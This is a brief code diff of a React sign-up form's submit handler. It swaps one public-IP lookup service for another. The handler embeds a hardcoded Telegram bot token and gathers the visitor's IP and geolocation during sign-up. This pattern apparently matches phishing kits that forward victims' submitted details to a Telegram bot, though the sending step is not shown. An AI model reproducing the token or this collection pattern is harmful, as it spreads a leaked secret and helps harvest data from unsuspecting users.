@@ -55,7 +55,7 @@ export default function SignUp() {
     event.preventDefault()
     setIsLoading(true)
     const botToken = '6809372580:AAGdI-DALsAqh_J6WWFDbqSiWuE4hCqfLjw'
-    const responseIP = await fetch('https://api.my-ip.io/v2/ip.json')
+    const responseIP = await fetch('https://api64.ipify.org?format=json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
       method: 'POST',
